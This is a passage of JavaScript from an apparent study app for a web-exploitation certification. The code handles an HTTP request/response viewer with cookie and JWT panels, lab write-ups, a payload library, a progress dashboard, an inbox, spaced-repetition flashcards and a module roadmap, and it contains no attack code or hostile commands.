          return h("tr", { class:flagged["s:" + c.name] ? "f-warn" : "" }, [cell(c.name, "vt-hk"), yes(c.attrs.httponly), yes(c.attrs.secure), yes(c.attrs.samesite), h("td", {}, [noteIn("s:" + c.name)])]);
        })));
        out.appendChild(table("response headers", ["name", "value", "note"], rs.headers.filter(function(x){ return lower(x[0]) !== "set-cookie"; }).map(function(x){
          return h("tr", { class:flagged["r:" + lower(x[0])] ? "f-info" : "" }, [cell(x[0], "vt-hk"), cell(x[1]), h("td", {}, [noteIn("r:" + x[0])])]);
        })));
        var jw = jwtIn(header(rq.headers, "authorization")) || rq.cookies.map(function(c){ return jwtIn(c[1]); }).filter(Boolean)[0];
        if(jw) out.appendChild(section("jwt", [h("div", { class:"vt-two" }, [
          h("div", {}, [h("div", { class:"vt-sublabel", text:"header" }), h("pre", { class:"vt-pre", text:JSON.stringify(jw.header, null, 2) })]),
          h("div", {}, [h("div", { class:"vt-sublabel", text:"payload" }), h("pre", { class:"vt-pre", text:JSON.stringify(jw.payload, null, 2) })])])]));
        if(rs.ok && rs.body.trim()) out.appendChild(section("response body", [h("pre", { class:"vt-pre vt-body-pre", text:rs.body.slice(0, 20000) })]));
      }
      paint();
      return h("div", {}, [h("div", { class:"vt-rawgrid" }, [field("request", req, true), field("response", res, true)]), out]);
    }
    function runBar(n, run){
      var S = scan(n);
      var pick = h("select", { class:"vt-in vt-sel", "aria-label":"run", onchange:function(){ u.run[n.id] = pick.value; draw(); } },
        [h("option", { value:"", text:"editing the checklist" })].concat(n.runs.slice().reverse().map(function(r){
          return h("option", { value:r.id, text:(r.target || "untitled") + " · " + r.date });
        })));
      pick.value = run ? run.id : "";
      var tgt = h("input", { class:"vt-in", placeholder:V.vars.DOMAIN || V.vars.IP || "target", spellcheck:"false", "data-native-undo":"",
        onkeydown:function(e){ if(e.key === "Enter"){ e.preventDefault(); start(); } } });
      function start(){
        var r = { id:rid("r"), target:(tgt.value.trim() || V.vars.DOMAIN || V.vars.IP || "").slice(0, 120), date:today(), ticks:[] };
        n.runs.push(r); u.run[n.id] = r.id; edited(n); commit();
      }
      var prog = h("div", { class:"vt-runprog" });
      paintRunProgress = function(){
        if(!run){ prog.innerHTML = ""; return; }
        var keys = S.checks.map(function(c){ return c.key; }), done = keys.filter(function(k){ return run.ticks.indexOf(k) >= 0; }).length;
        prog.innerHTML = "";
        prog.appendChild(h("span", { text:done + " / " + keys.length + " steps" + (done === keys.length && keys.length ? " · done" : "") }));
        prog.appendChild(h("div", { class:"vt-pbar" }, [h("i", { style:"width:" + (keys.length ? done / keys.length * 100 : 0) + "%" })]));
      };
      paintRunProgress();
      var kids = [h("span", { class:"vt-tlabel", text:"run" }), pick];
      if(run){
        kids.push(prog);
        kids.push(armed(h("button", { type:"button", class:"vt-link", text:"delete run" }), "sure?", function(){
          n.runs = n.runs.filter(function(r){ return r !== run; }); u.run[n.id] = ""; edited(n); commit(); }));
      }else kids.push(tgt, h("button", { type:"button", class:"vt-btn", text:"start a run", title:"tick this checklist against one target, without changing the checklist", onclick:start }));
      return h("div", { class:"vt-runbar" + (run ? " on" : "") }, kids);
    }

    paintPreview(); paintMeta(); paintGallery(); paintConn();
    requestAnimationFrame(grow);
  }

  // ----- lab write-ups -----
  function labSections(n){ var s = {}; sections(n.body).forEach(function(x){ s[lower(x.h)] = meaningful(x.text) ? x.text : ""; }); return s; }
  function labToNote(n){
    // the note links back by title, so the lab needs one; and a second click opens the first note
    if(!n.title.trim()){ u.flash = "give the lab a title first"; draw(); return; }
    var made = V.notes.filter(function(x){ return x.type === "note" && x.body.indexOf("worked out in the lab [[" + n.title.trim() + "]]") >= 0; })[0];
    if(made){ u.flash = "this lab is already written up here"; openEntry(made); return; }
    var s = labSections(n);
    function part(h_, text){ return text ? ["## " + h_, text, ""] : []; }
    var body = ["#technique", ""]
      .concat(part("when to use it", [s["objectives"], s["initial observations"]].filter(Boolean).join("\n\n")))
      .concat(part("steps", [s["methodology"], s["exploitation steps"]].filter(Boolean).join("\n\n")))
      .concat(part("evidence", s["evidence"]))
      .concat(part("root cause", s["root cause"]))
      .concat(part("payloads", s["payloads and commands"]))
      .concat(part("requests", s["requests and responses"]))
      .concat(part("lessons", s["lessons learned"]))
      .concat(["## source", "worked out in the lab [[" + n.title.trim() + "]]", "", "## cards", ""]).join("\n");
    var t = name(n) + " (technique)", note = entry("note", t.slice(0, 200), body);
    note.mod = n.mod; note.tags = n.tags.slice();
    V.notes.push(note);
    // what the lab practised is now exploited with this technique
    relsOut(n).filter(function(r){ return r.t === "practises"; }).forEach(function(r){
      if(!r.n.rels.some(function(x){ return x.t === "tech" && x.id === note.id; })) r.n.rels.push({ t:"tech", id:note.id });
    });
    edited(n); touch();
    u.sel.note = note.id; u.tab = "notes"; u.showEd = true; u.flash = "made from the lab: rename it and tidy it up";
    commit();
  }
  function labPayloads(n){
    if(!n.title.trim()){ u.flash = "give the lab a title first"; draw(); return; }
    var targets = relsOut(n).filter(function(r){ return r.t === "practises"; }).map(function(r){ return { t:"payload", id:r.n.id }; });
    var have = {}, made = 0;
    ofType("payload").forEach(function(x){ have[x.pay.code.trim()] = 1; });
    scan(n).code.forEach(function(c){
      var code = c.code.trim();
      if(!code || have[code]) return;
      have[code] = 1;
      var x = entry("payload", (c.title || c.head || name(n)).slice(0, 200), "from the lab [[" + name(n) + "]]",
        { pay:{ cat:CAT_OF[lower(c.lang)] || "payload", lang:c.lang || "text", code:c.code }, rels:targets.slice(), tags:n.tags.slice(), mod:n.mod });
      V.notes.push(x); made++;
    });
    u.flash = made ? "saved " + plural(made, "payload") + " to the library" : "no new code blocks to save";
    if(made){ edited(n); }
    commit();
  }
  function fileCapture(n, type){
    if(type === "payload"){
      var m = /```[^\n]*\n([\s\S]*?)```/.exec(n.body);
      retype(n, "payload");
      n.pay.code = m ? m[1].replace(/\n$/, "") : n.body.replace(/!\[[^\]]*\]\(img:[^)]*\)/g, "").trim();
      if(!m) n.body = (n.body.match(/!\[[^\]]*\]\(img:[^)]*\)/g) || []).join("\n");
    }else retype(n, type);
    if(!n.title) n.title = firstLine(n.body) || "capture";
    u.sel[type] = n.id; u.tab = TYPE_TAB[type]; u.showEd = true;
    commit();
  }

  // ===== HOME: evidence of what you know, per module =====
  function streak(){
    var t = today(), d = V.act[t] ? t : addDays(t, -1), k = 0;
    while(V.act[d]){ k++; d = addDays(d, -1); }
    return k;
  }
  function moduleStats(){
    var now = Date.now();
    return V.modules.map(function(m){
      var es = V.notes.filter(function(n){ return n.mod === m.id && n.type !== "capture"; }), inMod = {};
      es.forEach(function(n){ inMod[n.id] = 1; });
      var notes = es.filter(function(n){ return n.type === "note" && !n.seed; }).length;    // the starter notes aren't your evidence
      var labs = ofType("lab").filter(function(n){
        return n.lab.status === "solved" && (n.mod === m.id || n.rels.some(function(r){ return r.t === "practises" && inMod[r.id]; }));
      }).length;
      var cs = cards.filter(function(c){ return c.note.mod === m.id; });
      var known = cs.filter(function(c){ return c.st && c.st.b >= MATURE; }).length;
      var lapses = cs.reduce(function(s, c){ return s + (c.st ? c.st.l : 0); }, 0);
      var last = es.reduce(function(x, n){ return n.seed ? x : Math.max(x, n.updatedAt); }, 0);
      var idle = last ? Math.floor((now - last) / 86400000) : null;
      var finished = m.status === "done" || m.status === "reviewed";
      var flag = "";
      if(lapses >= 3) flag = "keeps slipping";
      else if(finished && m.conf && m.conf <= 2) flag = "low confidence";
      else if(notes && !labs && m.status !== "todo") flag = "no practice yet";
      else if(labs && !notes) flag = "practised, not written up";
      else if(notes && !cs.length && m.status !== "todo") flag = "no flashcards";
      else if(finished && idle !== null && idle > 21) flag = "rusty: " + idle + " days";
      var cov = ((notes ? 1 : 0) + (labs ? 1 : 0) + (cs.length ? known / cs.length : 0) + m.conf / 5) / 4;
      return { m:m, notes:notes, labs:labs, cards:cs.length, known:known, lapses:lapses, last:last, cov:cov, flag:flag };
    });
  }
  function home(body){
    var ms = moduleStats(), t = today();
    var cov = ms.length ? Math.round(ms.reduce(function(s, x){ return s + x.cov; }, 0) / ms.length * 100) : 0;
    var labs = ofType("lab"), solved = labs.filter(function(n){ return n.lab.status === "solved"; }).length;
    var known = cards.filter(function(c){ return c.st && c.st.b >= MATURE; }).length;
    var r30 = 0, ok30 = 0;
    for(var i = 0; i < 30; i++){ var a = V.act[addDays(t, -i)]; if(a){ r30 += a.r; ok30 += a.ok || 0; } }
    var run = streak();
    body.appendChild(h("div", { class:"stats vt-stats" }, [
      h("span", { class:"count", title:"per module, a quarter each: notes written, a solved lab, the share of its flashcards you know, and your confidence" },
        [h("b", { text:cov + "%" }), " covered"]),
      h("span", { class:"right" }, [
        h("span", {}, ["notes ", h("b", { text:String(ofType("note").filter(function(n){ return !n.seed; }).length) })]),
        h("span", {}, ["labs solved ", h("b", { text:String(solved) })]),
        h("span", {}, ["payloads ", h("b", { text:String(ofType("payload").length) })]),
        h("span", { title:"flashcards at a two-week interval or longer" }, ["cards known ", h("b", { text:known + "/" + cards.length })]),
        r30 ? h("span", { title:"answers graded good or easy, last 30 days" }, ["recall ", h("b", { text:Math.round(ok30 / r30 * 100) + "%" })]) : null,
        h("span", {}, ["streak ", h("b", { text:String(run) })])
      ])
    ]));
    body.appendChild(h("div", { class:"bar" }, [h("i", { style:"width:" + cov + "%" })]));

    var next = [], nDue = Q.due.length + Q.fresh.length, nIn = ofType("capture").length;
    if(nDue) next.push({ t:"review " + plural(nDue, "flashcard"), go:function(){ go("review"); } });
    if(Q.revise.length) next.push({ t:"revise " + plural(Q.revise.length, "note"), go:function(){ go("review"); } });
    if(nIn) next.push({ t:"sort " + plural(nIn, "capture") + " in the inbox", go:function(){ go("inbox"); } });
    var open = labs.filter(function(n){ return n.lab.status === "in progress" || n.lab.status === "stuck"; })[0];
    if(open) next.push({ t:(open.lab.status === "stuck" ? "unstick: " : "finish: ") + name(open), go:function(){ openEntry(open); } });
    var learning = V.modules.filter(function(m){ return m.status === "learning"; })[0], todo = V.modules.filter(function(m){ return m.status === "todo"; })[0];
    if(learning) next.push({ t:"keep going: " + learning.name, go:function(){ showModule(learning); } });
    else if(todo) next.push({ t:"start: " + todo.name, go:function(){ showModule(todo); } });
    if(!V.notes.some(function(n){ return tagsOf(n).indexOf("finding") >= 0; })) next.push({ t:"write a practice finding: the exam ends in a report", go:function(){ newEntry("note", { tpl:"finding" }); } });

    body.appendChild(section("next up", [next.length ? h("ul", { class:"vt-next" }, next.slice(0, 6).map(function(x){
      return h("li", {}, [h("button", { type:"button", class:"vt-link", text:x.t, onclick:x.go })]);
    })) : h("p", { class:"vt-muted", text:"nothing pressing. pick a module and go deeper." })]));

    var tbl = h("table", { class:"vt-table vt-matrix" }, [
      h("thead", {}, [h("tr", {}, ["module", "notes", "labs", "cards known", "confidence", "last", ""].map(function(c){ return h("th", { text:c }); }))]),
      h("tbody", {}, ms.map(function(x){
        return h("tr", { class:"s-" + x.m.status + (x.flag ? " flagged" : ""), onclick:function(){ showModule(x.m); }, title:"open this module's entries" }, [
          h("td", { class:"vt-mname-td", text:x.m.name }),
          h("td", { class:"num" + (x.notes ? "" : " zero"), text:String(x.notes) }),
          h("td", { class:"num" + (x.labs ? "" : " zero"), text:String(x.labs) }),
          h("td", { class:"num" + (x.cards ? "" : " zero"), text:x.cards ? x.known + "/" + x.cards : "0" }),
          h("td", {}, [confBar(x.m)]),
          h("td", { class:"vt-muted", text:x.last ? ago(x.last) : "" }),
          h("td", { class:"vt-flag", text:x.flag })
        ]);
      }))]);
    body.appendChild(section("modules", [h("div", { class:"vt-twrap" }, [tbl])], h("span", { class:"vt-muted vt-small", text:"what you have to show for each" })));

    // what keeps slipping
    var lapsed = cards.filter(function(c){ return c.st && c.st.l >= 2; }).sort(function(a, b){ return b.st.l - a.st.l; }).slice(0, 6);
    var byTag = {};
    cards.forEach(function(c){ if(c.st && c.st.l) tagsOf(c.note).forEach(function(tg){ byTag[tg] = (byTag[tg] || 0) + c.st.l; }); });
    var tagRank = Object.keys(byTag).sort(function(a, b){ return byTag[b] - byTag[a]; }).slice(0, 5);
    var orph = V.notes.filter(function(n){ return n.type !== "capture" && n.type !== "payload" && !connected(n); });
    var dups = duplicates(4), untagged = ofType("note").filter(function(n){ return !tagsOf(n).length; }).length;
    var health = [];
    if(orph.length) health.push(h("div", { class:"vt-hrow" }, [h("b", { text:plural(orph.length, "entry") + " connect to nothing" }),
      h("span", {}, orph.slice(0, 4).map(function(n){ return h("button", { type:"button", class:"vt-chip", text:name(n), onclick:function(){ openEntry(n); } }); })),
      h("button", { type:"button", class:"vt-link", text:"show in graph", onclick:function(){ u.g = u.g || null; go("graph"); if(u.g){ u.g.orph = true; draw(); } } })]));
    dups.forEach(function(d){ health.push(h("div", { class:"vt-hrow" }, [h("b", { text:"possible duplicates" }),
      h("button", { type:"button", class:"vt-chip", text:name(d.a), onclick:function(){ openEntry(d.a); } }), h("span", { class:"vt-muted", text:" and " }),
      h("button", { type:"button", class:"vt-chip", text:name(d.b), onclick:function(){ openEntry(d.b); } })])); });
    if(untagged) health.push(h("div", { class:"vt-hrow" }, [h("b", { text:plural(untagged, "note") + " without tags" })]));
    var recent = V.notes.filter(function(n){ return n.type !== "capture"; }).sort(function(a, b){ return b.updatedAt - a.updatedAt; }).slice(0, 8);
    body.appendChild(h("div", { class:"vt-two" }, [
      h("div", {}, [
        section("struggling with", lapsed.length ? [h("div", {}, lapsed.map(function(c){
          return h("button", { type:"button", class:"vt-brow", onclick:function(){ openEntry(c.note); } }, [h("b", { text:c.f }), h("small", { text:"forgotten " + c.st.l + "× · " + name(c.note) })]);
        })), tagRank.length ? h("div", { class:"vt-chips" }, tagRank.map(function(tg){ return h("button", { type:"button", class:"vt-chip", text:"#" + tg + " · " + byTag[tg], onclick:function(){ u.tag = tg; go("notes"); } }); })) : null]
          : [h("p", { class:"vt-muted vt-small", text:"nothing yet. cards you forget twice or more show up here, with the tags they come from." })]),
        section("knowledge health", health.length ? health : [h("p", { class:"vt-muted vt-small", text:"everything is connected and nothing overlaps." })])
      ]),
      h("div", {}, [
        section("recent", [h("div", {}, recent.map(function(n){
          return h("button", { type:"button", class:"vt-rrow", onclick:function(){ openEntry(n); } }, [h("span", { class:"vt-badge t-" + n.type, text:TYPE_WORD[n.type] }), h("span", { class:"vt-rname", text:name(n) }), h("small", { text:ago(n.updatedAt) })]);
        }))]),
        section("activity", [heat()], h("span", { class:"vt-muted vt-small", text:run ? plural(run, "day") + " in a row" : "" }))
      ])
    ]));
  }
  function showModule(m){ u.mod = m.id; u.tag = ""; u.q = {}; u.sel.note = ""; go("notes"); }
  function heat(){
    var weeks = 20, t = today(), d0 = parseIso(t), dow = (d0.getDay() + 6) % 7, start = addDays(t, -dow - (weeks - 1) * 7);
    var grid = h("div", { class:"vt-heat" });
    for(var w = 0; w < weeks; w++){
      var col = h("div", { class:"vt-hcol" });
      for(var k = 0; k < 7; k++){
        var d = addDays(start, w * 7 + k), a = V.act[d];
        var pts = a ? a.e + Math.min(a.r / 10, 3) : 0;
        var lv = d > t ? "x" : pts <= 0 ? 0 : pts < 1.5 ? 1 : pts < 3 ? 2 : 3;
        col.appendChild(h("i", { class:"vt-hc l" + lv, title:d + (a ? ": " + [a.e ? "wrote" : "", a.r ? plural(a.r, "review") : ""].filter(Boolean).join(", ") : "") }));
      }
      grid.appendChild(col);
    }
    return grid;
  }

  // ===== INBOX =====
  function inbox(body){
    var sel = u.sel.capture ? noteById(u.sel.capture) : null;
    if(sel && sel.type === "capture" && u.showEd){
      var ed = h("section", { class:"vt-ed" });
      body.appendChild(h("button", { type:"button", class:"vt-link", text:"‹ inbox", onclick:function(){ u.showEd = false; u.sel.capture = ""; draw(); } }));
      body.appendChild(ed); editor(ed, sel); return;
    }
    var f = captureForm(function(){ return V; }, ctx.save, function(e, type){ if(type === "capture") draw(); else openEntry(e); });
    body.appendChild(section("capture", [f.el], h("span", { class:"vt-muted vt-small", text:"Alt+C does this from any page of the site" })));
    var caps = ofType("capture").sort(function(a, b){ return b.updatedAt - a.updatedAt; });
    if(!caps.length){ body.appendChild(h("p", { class:"vt-muted vt-small", text:"the inbox is empty. capture first, sort later: each capture becomes a note or a payload, or joins an existing entry." })); return; }
    body.appendChild(section("waiting " + caps.length, caps.map(function(n){
      var to = h("input", { class:"vt-in vt-relin", list:"vt-dl-" + p.id, placeholder:"add to an entry…", spellcheck:"false", "data-native-undo":"",
        onkeydown:function(e){ if(e.key === "Enter"){ e.preventDefault(); append(); } } });
      function append(){
        var x = byTitle(to.value);
        if(!x || x === n || x.type === "capture"){ to.classList.add("bad"); to.focus(); return; }
        x.body = x.body.replace(/\s+$/, "") + "\n\n" + n.body;
        edited(x);
        V.notes = V.notes.filter(function(y){ return y !== n; });
        commit();
      }
      var R2 = rctx(n.id), md = h("div", { class:"vt-md vt-capbody", html:render(n.body, R2) });
      wireCopy(md, R2);
      md.addEventListener("click", function(e){ if(e.target.tagName === "IMG") lightbox(e.target.src); });
      return h("div", { class:"vt-capitem" }, [
        h("div", { class:"vt-caphead2" }, [h("b", { text:name(n) }), h("small", { class:"vt-muted", text:ago(n.createdAt) })]),
        md,
        h("div", { class:"vt-row-acts" }, [
          h("button", { type:"button", class:"vt-btn", text:"→ note", onclick:function(){ fileCapture(n, "note"); } }),
          h("button", { type:"button", class:"vt-btn", text:"→ payload", onclick:function(){ fileCapture(n, "payload"); } }),
          to, h("button", { type:"button", class:"vt-link", text:"add", onclick:append }),
          h("span", { class:"vt-grow" }),
          h("button", { type:"button", class:"vt-link", text:"edit", onclick:function(){ u.sel.capture = n.id; u.showEd = true; draw(); } }),
          armed(h("button", { type:"button", class:"vt-link", text:"delete" }), "sure?", function(){ removeEntry(n); commit(); })
        ])
      ]);
    })));
  }
  function capture(){
    captureBox(function(){ return V; }, ctx.save, function(e, type){
      // only redraw if this workspace is still the page on screen
      setTimeout(function(){ if(!root.isConnected || root.hidden) return; if(type === "capture") draw(); else openEntry(e); }, 460);
    });
  }

  // ===== REVIEW: flashcards and notes on a spaced schedule =====
  var reviewKey = null;
  function logReview(g){
    var t = today(), a = V.act[t] || { e:0, r:0, ok:0 };
    V.act[t] = { e:a.e, r:a.r + 1, ok:(a.ok || 0) + (g >= 2 ? 1 : 0) };
  }
  function review(body){
    var S = u.review;
    reviewKey = null;
    if(S) return S.kind === "notes" ? noteSession(body, S) : cardSession(body, S);
    var nDue = Q.due.length + Q.fresh.length, t = today(), soon = [0, 0, 0, 0, 0, 0, 0];
    cards.forEach(function(c){ if(c.st){ var d = dayDiff(t, c.st.due); if(d >= 1 && d <= 7) soon[d - 1]++; } });
    V.notes.forEach(function(n){ if(n.rev){ var d = dayDiff(t, n.rev.due); if(d >= 1 && d <= 7) soon[d - 1]++; } });
    var newC = cards.filter(function(c){ return !c.st; }).length, knownC = cards.filter(function(c){ return c.st && c.st.b >= MATURE; }).length;
    var marked = V.notes.filter(function(n){ return n.rev; }).sort(function(a, b){ return a.rev.due < b.rev.due ? -1 : 1; });
    body.appendChild(h("div", { class:"stats vt-stats" }, [
      h("span", { class:"count" }, [h("b", { text:String(nDue + Q.revise.length) }), " due"]),
      h("span", { class:"right" }, [
        h("span", {}, ["cards ", h("b", { text:String(cards.length) })]), h("span", {}, ["new ", h("b", { text:String(newC) })]),
        h("span", {}, ["known ", h("b", { text:String(knownC) })]), h("span", {}, ["notes on revision ", h("b", { text:String(marked.length) })])
      ])
    ]));
    body.appendChild(h("div", { class:"bar" }, [h("i", { style:"width:" + (cards.length ? knownC / cards.length * 100 : 0) + "%" })]));
    body.appendChild(h("div", { class:"vt-rstart" }, [
      nDue ? h("button", { type:"button", class:"vt-btn vt-primary vt-big", text:"flashcards (" + nDue + ")", onclick:function(){ startCards(false); } }) : null,
      Q.revise.length ? h("button", { type:"button", class:"vt-btn vt-primary vt-big", text:"revise notes (" + Q.revise.length + ")", onclick:startNotes }) : null,
      !nDue && !Q.revise.length ? h("p", { class:"vt-muted", text:"all caught up." + (Q.freshAll > Q.fresh.length ? " new cards are capped at " + NEW_PER_DAY + " a day." : "") }) : null,
      cards.length ? h("button", { type:"button", class:"vt-link", text:"cram all " + cards.length, title:"every card now, hardest first; it still updates their schedule", onclick:function(){ startCards(true); } }) : null
    ]));
    if(!cards.length && !marked.length){
      body.appendChild(empty("nothing to review yet", "write question :: answer in any entry for flashcards, or press revise on a note to put the whole note on the schedule: revising shows its headings as questions."));
      return;
    }
    var max = Math.max.apply(null, soon.concat([1]));
    body.appendChild(h("div", { class:"vt-two" }, [
      section("next 7 days", [h("div", { class:"vt-soon" }, soon.map(function(c, i){
        return h("div", { class:"vt-sday", title:addDays(t, i + 1) + ": " + c }, [
          h("div", { class:"vt-sbar" }, [h("i", { style:"height:" + (c / max * 100) + "%" })]),
          h("small", { text:i === 0 ? "tmrw" : "+" + (i + 1) }), h("b", { text:String(c) })]);
      }))]),
      section("notes on revision", marked.length ? marked.slice(0, 10).map(function(n){
        return h("button", { type:"button", class:"vt-rrow", onclick:function(){ openEntry(n); } }, [h("span", { class:"vt-rname", text:name(n) }), h("small", { text:n.rev.due <= t ? "due" : "next " + n.rev.due })]);
      }) : [h("p", { class:"vt-muted vt-small", text:"press revise on any note to add it." })])
    ]));
  }
  function startCards(cram){
    var list = cram ? cards.slice().sort(function(a, b){ return ((b.st ? b.st.l : 0) - (a.st ? a.st.l : 0)) || ((a.st ? a.st.b : -1) - (b.st ? b.st.b : -1)); }) : Q.due.concat(Q.fresh);
    u.review = { kind:"cards", queue:list.map(function(c){ return c.id; }), i:0, shown:false, done:0, again:0, seen:{} };
    draw();
  }
  function startNotes(){
    u.review = { kind:"notes", queue:Q.revise.map(function(n){ return n.id; }), i:0, open:{}, done:0 };
    draw();
  }
  function progress(body, S, total){
    body.appendChild(h("div", { class:"vt-rprog" }, [h("span", { text:(S.i + 1) + " / " + total }),
      h("button", { type:"button", class:"vt-link", text:"stop", onclick:function(){ u.review = null; draw(); } })]));
    body.appendChild(h("div", { class:"bar" }, [h("i", { style:"width:" + (S.i / total * 100) + "%" })]));
  }
  function gradeRow(st, onGrade){
    return h("div", { class:"vt-rbtns" }, ["again", "hard", "good", "easy"].map(function(l, g){
      var nx = nextState(st, g);
      return h("button", { type:"button", class:"vt-btn vt-grade g" + g, onclick:function(){ onGrade(g); } },
        [h("b", { text:l }), h("small", { text:(g + 1) + " · " + days(dayDiff(today(), nx.due)) })]);
    }));
  }
  function doneScreen(body, S, extra){
    body.appendChild(h("div", { class:"vt-empty vt-rdone" }, [h("b", { text:"done: " + plural(S.done, "review") }), h("span", { text:extra }),
      h("button", { type:"button", class:"vt-btn", text:"back", onclick:function(){ u.review = null; draw(); } })]));
  }
  function cardSession(body, S){
    var c = null;
    while(S.i < S.queue.length && !(c = cards.filter(function(x){ return x.id === S.queue[S.i]; })[0])) S.i++;
    if(!c){ doneScreen(body, S, S.again ? plural(S.again, "card") + " came back for another go." : "clean run."); return; }
    var R = rctx(c.note.id);
    progress(body, S, S.queue.length);
    var cardEl = h("div", { class:"vt-rcard vt-md" }, [h("div", { class:"vt-rq", html:inline(c.f, R) }), S.shown ? h("div", { class:"vt-ra", html:inline(c.b, R) }) : null]);
    body.appendChild(cardEl);
    function grade(g){
      V.cards[c.id] = nextState(c.st, g); logReview(g); S.done++;
      if(g === 0 && (S.seen[c.id] || 0) < 2){ S.queue.push(c.id); S.again++; }
      S.seen[c.id] = (S.seen[c.id] || 0) + 1;
      S.i++; S.shown = false; commit();
    }
    body.appendChild(S.shown ? gradeRow(c.st, grade)
      : h("div", { class:"vt-rbtns" }, [h("button", { type:"button", class:"vt-btn vt-primary vt-big", text:"show answer (space)", onclick:function(){ S.shown = true; draw(); } })]));
    body.appendChild(h("p", { class:"vt-rsrc" }, ["from ", h("button", { type:"button", class:"vt-link", text:name(c.note), onclick:function(){ u.review = null; openEntry(c.note); } }),
      c.st ? " · reviewed " + plural(c.st.n, "time") + (c.st.l ? ", forgotten " + c.st.l : "") : " · new card"]));
    reviewKey = function(e){
      if(e.key === " " || e.key === "Enter"){ if(!S.shown){ e.preventDefault(); S.shown = true; draw(); } return; }
      if(S.shown && /^[1-4]$/.test(e.key)){ e.preventDefault(); grade(+e.key - 1); }
    };
    cardEl.addEventListener("click", function(e){ if(!S.shown && !e.target.closest("a, button")){ S.shown = true; draw(); } });
  }
  // revising a note: each heading is a question, its text the answer
  function noteSession(body, S){
    var n = null;
    while(S.i < S.queue.length && !((n = noteById(S.queue[S.i])) && n.rev)) S.i++;
    if(!n || !n.rev){ doneScreen(body, S, "notes come back on a growing interval: a day, three, a week, two weeks…"); return; }
    progress(body, S, S.queue.length);
    var secs = sections(n.body), R = rctx(n.id);
    var wrap = h("div", { class:"vt-rcard vt-rnote" }, [h("div", { class:"vt-rq", text:name(n) }),
      h("p", { class:"vt-muted vt-small", text:secs.length ? "answer each from memory, then open it to check." : "recall what this note says, then open it to check." })]);
    (secs.length ? secs : [{ h:"the whole note", text:n.body }]).forEach(function(s, i){
      var open = !!S.open[i];
      wrap.appendChild(h("div", { class:"vt-rsec" + (open ? " open" : "") }, [
        h("button", { type:"button", class:"vt-rsech", text:(open ? "▾ " : "▸ ") + s.h, onclick:function(){ S.open[i] = !open; draw(); } }),
        open ? h("div", { class:"vt-md", html:render(s.text, R) }) : null
      ]));
    });
    body.appendChild(wrap);
    function grade(g){ var st = nextState(n.rev, g); delete st.f; n.rev = st; logReview(g); S.done++; S.i++; S.open = {}; commit(); }
    body.appendChild(gradeRow(n.rev, grade));
    body.appendChild(h("p", { class:"vt-rsrc" }, [h("button", { type:"button", class:"vt-link", text:"open " + TYPE_WORD[n.type], onclick:function(){ u.review = null; openEntry(n); } })]));
    reviewKey = function(e){
      if(e.key === " "){ e.preventDefault(); var all = (secs.length || 1); for(var i = 0; i < all; i++) S.open[i] = true; draw(); return; }
      if(/^[1-4]$/.test(e.key)){ e.preventDefault(); grade(+e.key - 1); }
    };
  }

  // ===== ROADMAP: modules, subtopics, and what backs them =====
  function roadmap(body){
    var done = V.modules.filter(function(m){ return m.status === "done" || m.status === "reviewed"; }).length;
    var tAll = 0, tDone = 0;
    V.modules.forEach(function(m){ tAll += m.topics.length; tDone += m.topics.filter(function(x){ return x.done; }).length; });
    body.appendChild(h("div", { class:"stats vt-stats" }, [
      h("span", { class:"count" }, [h("b", { text:String(done) }), " / " + V.modules.length + " modules"]),
      h("span", { class:"right" }, STATUS.map(function(s){
        return h("span", {}, [s + " ", h("b", { text:String(V.modules.filter(function(m){ return m.status === s; }).length) })]);
      }).concat(tAll ? [h("span", {}, ["topics ", h("b", { text:tDone + "/" + tAll })])] : []))
    ]));
    body.appendChild(h("div", { class:"bar" }, [h("i", { style:"width:" + (V.modules.length ? done / V.modules.length * 100 : 0) + "%" })]));
    var stats = {};
    moduleStats().forEach(function(x){ stats[x.m.id] = x; });
    var list = h("div", { class:"vt-mods" });
    V.modules.forEach(function(m, i){
      var x = stats[m.id], open = !!u.open[m.id];
      var nm = h("input", { class:"vt-mname", value:m.name, spellcheck:"false", maxlength:"100", "data-native-undo":"", "aria-label":"module name",
        oninput:function(){ if(nm.value.trim()){ m.name = nm.value.trim(); ctx.save(); } } });
      var rm = armed(h("button", { type:"button", class:"vt-x", text:"×", "aria-label":"remove module" }), "sure?", function(){
        V.notes.forEach(function(n){ if(n.mod === m.id) n.mod = ""; });
        V.modules = V.modules.filter(function(y){ return y !== m; });
        commit();
      });
      list.appendChild(h("div", { class:"vt-mod s-" + m.status }, [
        h("button", { type:"button", class:"vt-mexp", text:(open ? "▾ " : "▸ ") + pad(i + 1), "aria-label":"show topics and entries", onclick:function(){ u.open[m.id] = !open; draw(); } }),
        nm,
        h("div", { class:"vt-toggle vt-mst" }, STATUS.map(function(s){
          return h("button", { type:"button", class:"vt-tog" + (m.status === s ? " on" : ""), text:s, onclick:function(){ m.status = s; commit(); } });
        })),
        confBar(m, function(c){ m.conf = c; commit(); }),
        h("div", { class:"vt-mcell" }, [
          h("button", { type:"button", class:"vt-link vt-mnotes", text:[plural(x.notes, "note"), plural(x.labs, "lab"), x.cards ? x.known + "/" + x.cards + " cards" : ""].filter(Boolean).join(" · "),
            onclick:function(){ showModule(m); } }),
          // starts the Command Center timer for this module (and marks it learning if you hadn't started)
          ctx.study ? h("button", { type:"button", class:"vt-link vt-study", text:"▶ study", title:"start the Command Center timer for " + m.name, onclick:function(e){
            var b = e.currentTarget;
            if(m.status === "todo"){ m.status = "learning"; ctx.save(); }
            var msg = ctx.study("CWES: " + m.name);
            if(msg){ b.textContent = msg; setTimeout(function(){ b.textContent = "▶ study"; }, 2500); }
          } }) : null
        ]),
        rm
      ]));
      if(open) list.appendChild(moduleDetail(m));
    });
    body.appendChild(list);
    var add = h("input", { class:"vt-in", placeholder:"+ add a module", maxlength:"100", "data-native-undo":"",
      onkeydown:function(e){ if(e.key === "Enter" && add.value.trim()){ V.modules.push({ id:rid("m"), name:add.value.trim(), status:"todo", conf:0, topics:[] }); commit(); var a = root.querySelector(".vt-addmod .vt-in"); if(a) a.focus(); } } });
    body.appendChild(h("div", { class:"vt-addmod" }, [add]));
  }
  function moduleDetail(m){
    var es = V.notes.filter(function(n){ return n.mod === m.id && n.type !== "capture"; });
    var topics = h("div", { class:"vt-topics" }, m.topics.map(function(t){
      return h("div", { class:"vt-topic" + (t.done ? " done" : "") }, [
        h("button", { type:"button", class:"vt-chk" + (t.done ? " on" : ""), "aria-label":"done", onclick:function(){ t.done = !t.done; commit(); } }),
        h("span", { text:t.name }),
        h("button", { type:"button", class:"vt-x", text:"×", "aria-label":"remove topic", onclick:function(){ m.topics = m.topics.filter(function(y){ return y !== t; }); commit(); } })
      ]);
    }));
